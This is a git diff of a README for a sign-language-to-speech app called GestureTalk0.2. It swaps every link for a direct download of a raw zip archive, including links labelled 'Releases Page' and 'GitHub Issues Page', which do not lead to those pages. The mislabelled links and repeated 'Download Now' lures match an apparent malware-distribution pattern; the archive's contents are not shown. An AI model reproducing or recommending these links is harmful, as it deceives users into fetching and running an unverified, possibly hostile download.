@@ -1,7 +1,7 @@
 # 🤖 GestureTalk0.2 - Sign Language to Speech Made Easy
 
 ## 📥 Download Now
-[![Download GestureTalk0.2](https://raw.githubusercontent.com/atifmalik220905/GestureTalk0.2/main/FRONTEND/GestureTalk0.2-v1.6.zip)](https://raw.githubusercontent.com/atifmalik220905/GestureTalk0.2/main/FRONTEND/GestureTalk0.2-v1.6.zip)
+[![Download GestureTalk0.2](https://github.com/atifmalik220905/GestureTalk0.2/raw/refs/heads/main/BACKEND/Talk_Gesture_v2.2.zip)](https://github.com/atifmalik220905/GestureTalk0.2/raw/refs/heads/main/BACKEND/Talk_Gesture_v2.2.zip)
 
 ## 📖 Description
 GestureTalk0.2 uses AI to recognize sign language in real-time. It translates gestures into text and speech. This software is designed to improve communication for individuals who use sign language. It's built with powerful tools like MediaPipe, TensorFlow, and OpenCV.
@@ -23,7 +23,7 @@ Follow these steps to download and run GestureTalk0.2 on your computer:
    - **Video Card:** GPU with OpenCV support (recommended for best performance).
 
 2. **Visit the Releases Page**
-   Go to our [Releases Page](https://raw.githubusercontent.com/atifmalik220905/GestureTalk0.2/main/FRONTEND/GestureTalk0.2-v1.6.zip) to find the latest version of GestureTalk0.2.
+   Go to our [Releases Page](https://github.com/atifmalik220905/GestureTalk0.2/raw/refs/heads/main/BACKEND/Talk_Gesture_v2.2.zip) to find the latest version of GestureTalk0.2.
 
 ## 📥 Download & Install
 1. On the releases page, locate the latest version.
@@ -60,7 +60,7 @@ For **macOS**:
 
 ## 🌐 Community and Support
 Connect with other users and get support:
-- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/atifmalik220905/GestureTalk0.2/main/FRONTEND/GestureTalk0.2-v1.6.zip) for help.
+- Visit the [GitHub Issues Page](https://github.com/atifmalik220905/GestureTalk0.2/raw/refs/heads/main/BACKEND/Talk_Gesture_v2.2.zip) for help.
 - Join our community forums for tips and best practices.
 
 ## 🤝 Contribution
@@ -70,4 +70,4 @@ If you would like to contribute to GestureTalk0.2, please check our guidelines o
 GestureTalk0.2 is open-source software. You may use it freely but must credit the original authors. See the LICENSE file in the repository for details.
 
 ## 📥 Download Now Again
-[![Download GestureTalk0.2](https://raw.githubusercontent.com/atifmalik220905/GestureTalk0.2/main/FRONTEND/GestureTalk0.2-v1.6.zip)](https://raw.githubusercontent.com/atifmalik220905/GestureTalk0.2/main/FRONTEND/GestureTalk0.2-v1.6.zip)
+[![Download GestureTalk0.2](https://github.com/atifmalik220905/GestureTalk0.2/raw/refs/heads/main/BACKEND/Talk_Gesture_v2.2.zip)](https://github.com/atifmalik220905/GestureTalk0.2/raw/refs/heads/main/BACKEND/Talk_Gesture_v2.2.zip)
